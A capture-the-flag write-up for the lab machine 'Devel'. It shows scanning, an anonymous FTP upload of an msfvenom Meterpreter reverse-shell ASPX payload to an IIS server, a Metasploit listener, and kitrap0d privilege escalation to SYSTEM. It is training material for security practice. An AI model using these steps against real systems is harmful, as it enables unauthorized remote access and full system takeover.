# Devel

This is the write-up for a machine called Devel. 

## Scanning & Enumeration

Let's start with an nmap scan:

```markdown
nmap -T4 -A -p- 10.10.10.5
```

Relevant results of the scan: 

```markdown
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## FTP

FTP anonymous login is allowed and we find the files **welcome.png** and **iisstart.htm**.

## HTTP

The HTTP port is open and a web server is running on the machine. The web server is IIS as seen in the exposed http-server-header.
The **welcome.png** is an image on the web page and **iisstart.htm** is the index file and both of these services have root privileges.
We can upload something, say, an image or an exploit on the FTP server and we can access it on the web server.
IIS 7.5 servers support ASP and ASPX type files so we will use that format to execute our exploit.

## Creating and executing a payload using msfvenom 

We can create a payload with **msfvenom** and upload the exploit **"exploit.aspx"** file to the FTP server:

```markdown
msfvenom -p windows/meterpreter/reverse_tcp LHOST= <your_ip> LPORT=4444 -f aspx -o shell.aspx > exploit.aspx
```

We have a file called exploit.aspx that we will upload to the FTP.

Load **Metasploit** and set up your listener:

```markdown
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <your_ip>
run
```
After you run exploit, it will wait for a connection. Browse to http://10.10.10.5/exploit.aspx to activate the listener. We will get a meterpreter session on the machine. 
We are user **IIS Apppool\Web** on the machine and we want to escalate our privileges by exploiting any vulnerabilities.

## Privilege Escalation using Metasploit

We will use the Metasploit module **post/multi/recon/local_exploit_suggester** to identify any vulnerabilities:

```markdown
use post/multi/recon/local_exploit_suggester
set session 1
run
```

This will list down the different modules to which the target machine is vulnerable to. We will use **exploit/windows/local/ms10_015_kitrap0d**:

```markdown
use exploit/windows/local/ms10_015_kitrap0d
set session 1
set LHOST <your_ip>
set LPORT 4445
run
```

We will have a new meterpreter session with escalated priveleges and we will be **NT Authority\SYSTEM** on the machine. 
